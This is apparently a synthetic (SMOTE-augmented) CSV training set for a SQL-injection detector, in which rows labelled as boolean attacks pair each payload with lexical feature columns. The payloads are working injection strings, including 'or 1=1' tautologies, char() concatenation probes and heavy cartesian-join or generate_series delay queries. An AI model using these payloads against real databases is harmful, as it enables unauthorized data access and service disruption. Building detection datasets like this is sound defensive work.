id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000122,attack,boolean,-1021  )   as erjh where 7845  =  7845 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,nearest_attack_euclidean,R001648,0.012766901280232498,374.00611492975145,37.00611492975145,3.679174255224348,101.0,56.0,156.00000000000003,61.00611492975145,0.2700490723144036,0.14973017870897623,0.4171054978321481,0.16311525114447203,0.006114929751444231,-1.1102230246251565e-16,3.0,0.0,0.0,3.0,0.0,31.0,0.0,3.0,0.0,26.0,0.006114929751444231,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000123,attack,boolean,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',nearest_attack_euclidean,R000212,0.6301556134024168,59.242978306012944,23.0,3.7800067902326644,24.0,4.0,18.621489153006472,12.621489153006472,0.4052208392688762,0.0675368065448127,0.31427378200176503,0.212968572184546,3.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,0.0,0.6214891530064737,0.0,0.0,7.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000124,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R002260,0.7030032770913938,31.54775672793825,17.763482884804116,3.7589616567959374,6.236517115195888,13.892136921567074,8.182585575979424,3.236517115195884,0.2021062615098465,0.4372149111865604,0.2568754975347641,0.10380332976882888,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.236517115195884,0.0,0.0,0.0,0.0,0.0,2.2365171151958845,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.23651711519588423,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.236517115195884
SMOTE_000125,attack,boolean,"-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq",nearest_attack_euclidean,R002416,0.01199304988133515,87.17743784427722,28.0,3.5628824844553924,20.047316758473926,16.0,38.09463351694785,13.035487568855444,0.2299490422697416,0.18358812198462526,0.4369495692914051,0.14951326645422808,0.0,4.0,1.0,0.0,0.0,1.0,0.0,6.023658379236962,0.0,0.011829189618481228,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000126,attack,boolean,"1' in boolean mode  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R000324,0.5930113180904598,119.14407213307244,30.776747745841487,3.832534034343458,52.930090166340555,11.88373872920743,41.10699098336595,13.223252254158513,0.4353813817444788,0.10256112350826453,0.3501941939823873,0.11186330076486928,1.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,6.5534954916829715,0.0,0.7767477458414862,1.2232522541585138,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000127,attack,boolean,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,nearest_attack_euclidean,R000151,0.02167095067490978,57.0,22.85480350018446,3.7036699486970317,24.0,4.0,19.0,10.0,0.42105263157894735,0.07017543859649122,0.3333333333333333,0.17543859649122806,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000128,attack,boolean,and 1 in   (  select var from temp  )  --,nearest_attack_euclidean,R000071,0.06500280455359533,40.928588401140615,19.92858840114061,3.6444245989552035,21.910735501425762,1.0,13.982147100285154,4.035705799429696,0.5352084447813862,0.024437318127132096,0.3416399429767454,0.0987142941147364,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,0.9821471002851521,0.9821471002851521,0.017852899714847936,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.982147100285152
SMOTE_000129,attack,boolean,1'+  (  select 'czpg' where 6627  =  6627 and 2006  =  2006,nearest_attack_euclidean,R001127,0.4062083592304669,61.27783730232257,24.65081065780645,3.8746312580160187,18.0,17.0,18.3016213156129,7.976215986709674,0.2945554516071376,0.2781912598511855,0.2979127949362294,0.12934049360544755,3.3254053289032246,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,1.3254053289032237,0.0,0.0,0.0,3.3254053289032246,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000130,attack,boolean,"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --",nearest_attack_euclidean,R001777,0.38618531739322604,70.91432258138282,24.53766568921662,3.7162387449097785,14.61299706764986,22.150662756866478,25.075331378433244,9.07533137843324,0.20565963883385915,0.3120458760260455,0.3546463153127476,0.12764816982734778,1.0,-1.1102230246251565e-16,3.0,0.0,0.0,2.0,0.0,2.5376656892166203,0.0,0.0,0.5376656892166198,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,boolean,"-6519'   )    )    as tdlt where 5040  =  5040 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000485,0.13197128191098953,385.26715881917073,32.0,3.423710764333698,99.7068635276683,58.0,173.94248470355774,53.61781058794472,0.2587482548822093,0.15059928707411505,0.4514557899010846,0.13919666814259102,1.0,-1.1102230246251565e-16,3.0,0.0,0.0,3.0,0.0,35.61781058794472,0.0,0.0,1.0,16.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000132,attack,boolean,"1'||  (  select 'ejuu' from dual where 2903  =  2903 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",nearest_attack_euclidean,R000845,0.14812366812669686,180.18987156750939,34.40144691892723,4.243294042127335,92.18987156750939,16.0,50.0,22.0,0.5114477365232497,0.08882768426850006,0.2775865133390627,0.12213806586918757,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000133,attack,boolean,-1468'   )    )     )   or 4875  =  6163#,nearest_attack_euclidean,R001328,0.007726651545794972,41.0,15.0,2.8677624495752507,2.0,12.0,20.0,7.0,0.04878048780487804,0.2926829268292683,0.4878048780487805,0.17073170731707318,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,1.0,0.0,3.000000000000001,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000134,attack,boolean,"1'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001822,0.07769131693765552,184.45285406070494,31.0,3.6269185633414494,53.0,25.0,75.37737838392077,31.075475676784155,0.2876404120278722,0.13567943963578877,0.4082044224745285,0.1684757258618105,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,17.075475676784155,0.0,1.0,3.0,9.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000135,attack,boolean,-8465' where 5242  =  5242 or 3806  =  7423--,nearest_attack_euclidean,R000756,0.005509656145121584,45.0,17.0,3.6244120487677276,7.0,20.0,12.0,6.0,0.15555555555555556,0.4444444444444444,0.26666666666666666,0.13333333333333333,1.0,-1.1102230246251565e-16,3.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000136,attack,boolean,"1%""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000769,0.08934614785674079,198.76233130342294,29.0,3.527752142918626,111.0,12.0,54.51056968864824,21.251761614774708,0.5587456690480442,0.060404937194383154,0.2739475706589912,0.10690182309858146,0.0,4.0,0.0,0.0,1.0,2.0,0.0,6.251761614774707,2.0,0.0,6.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000137,attack,boolean,-9358' or 9887  =  2569--,nearest_attack_euclidean,R000948,0.03486691683529065,25.0,13.0,3.387520803945838,2.0,12.0,6.0,5.0,0.08000000000000002,0.48,0.24,0.2,1.0,-1.1102230246251565e-16,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000138,attack,boolean,"1%"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001650,0.15811808412068287,125.79790801755095,30.478744810530575,4.083185659872245,71.0,8.15958160351019,31.319163207020384,15.319163207020384,0.5645137557387003,0.06483473454143793,0.2489329386051365,0.12171857111472514,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,1.0,0.0,2.159581603510192,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000139,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003077,0.11280400931694909,113.13746884659813,31.0,3.8321676580363593,44.252473000385045,13.0,41.827493769319624,14.057502076893458,0.39062518376280164,0.11502861111059935,0.36988841025565444,0.12445779487094458,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,7.0,0.057502076893458376,1.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000140,attack,boolean,1'  )   as epgz where 2898  =  2898 and 7028  =  2287#,nearest_attack_euclidean,R002665,0.09439311805543299,54.22717745654762,22.11358872827381,3.6433264510100405,14.227177456547626,17.0,17.943205635863094,5.056794364136907,0.26216063162896075,0.3135817315576917,0.3310485025921934,0.09320913422115415,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,2.056794364136907,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.05679436413690664,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0567943641369064
SMOTE_000141,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R002699,0.17294250423884946,81.7382900927553,26.4966543122158,3.832242319412424,20.0,24.0,27.4899629366474,10.2483271561079,0.24500491352656523,0.2940058962318783,0.3356323983505969,0.12535679189095963,0.0,-1.1102230246251565e-16,3.0,0.0,0.0,2.0,0.0,3.2483271561079015,0.0,1.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000142,attack,boolean,"1""  )   as pgza where 8756  =  8756 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001709,0.19916056729756806,151.12205589429556,37.43897205285222,4.316635057079796,75.28051397357389,16.28051397357389,43.0,16.56102794714778,0.4981784806910786,0.10771100440378158,0.2845779911924368,0.10953252371270294,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.2805139735738904,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000143,attack,boolean,1'   )    )    and 6690  =  3250#,nearest_attack_euclidean,R001355,0.16294851193350535,34.03663939128067,15.0,2.885791398371897,3.0,9.0,16.829311513024535,5.207327878256134,0.08842909236535723,0.2652872770960717,0.4934458131334282,0.1528378174051428,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.207327878256134,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000144,attack,boolean,"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000883,0.00014217781919238242,131.99951158334534,27.00008140277578,3.8403678152643144,62.0,10.0,39.999511583345324,20.0,0.4696987903939749,0.07575786941838306,0.30302760135087603,0.15151573883676608,0.0,1.0,2.0,0.0,1.0,1.0,0.0,5.999918597224221,8.140277577900479e-05,5.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000145,attack,boolean,"1%""   )    )    and 7358  =  6986--",nearest_attack_euclidean,R002778,0.10413612646192823,35.389309998785734,15.688552000971413,3.037186312916006,3.0,9.0,16.31144799902858,7.077861999757147,0.08488005000260199,0.254640150007806,0.460479799989592,0.2,0.0,1.0,2.0,0.0,0.0,1.0,0.0,2.077861999757146,1.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000146,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",nearest_attack_euclidean,R003466,0.1090076384462677,232.45753827178754,34.06027352535694,3.5823862632149477,64.24109410142778,27.0,103.39726474643058,37.81917942392917,0.27641961366183077,0.11616045498662125,0.44474208127016446,0.16267785008138358,0.0,4.0,0.0,0.0,0.0,1.9397264746430571,0.0,21.879452949286115,0.0,1.0,3.0,7.939726474643057,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000147,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000148,attack,boolean,"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",nearest_attack_euclidean,R000426,0.1328938487460136,113.0,27.831442304866385,3.6343177043235415,42.0,13.0,46.0,12.0,0.37168141592920356,0.11504424778761062,0.40707964601769914,0.10619469026548672,0.0,4.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000149,attack,boolean,end and    (    (   '%'  =  ',nearest_attack_euclidean,R001193,1.379113114160196,34.62240665191858,9.937067775319765,2.4569793072960575,9.748271101279059,0.0,17.87413555063953,7.0,0.26994568715355854,0.0,0.5217757986020597,0.20827851424438176,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.4685338876598824,0.531466112340118,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000150,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'dssx' like 'dssx",nearest_attack_euclidean,R003616,0.19809773109447812,166.7768806616584,32.01944952852795,3.897591564123659,81.37871556656522,8.0,57.71853207607454,19.679633019018635,0.4881219775959937,0.048076800708588635,0.3458006569843251,0.11800056471109256,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,8.679633019018635,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000151,attack,boolean,1'  )   and 7533  =  7533 and   (  'xyga' like 'xyga,nearest_attack_euclidean,R002946,0.031755075349361554,52.57112650325729,19.09518775054288,3.5288354720713593,18.09518775054288,9.126917000723841,18.253834001447686,7.095187750542882,0.3446894192224172,0.17347789711767148,0.34695579423534295,0.13487688942456835,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,2.0634585003619206,0.0,0.0,0.03172925018096051,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
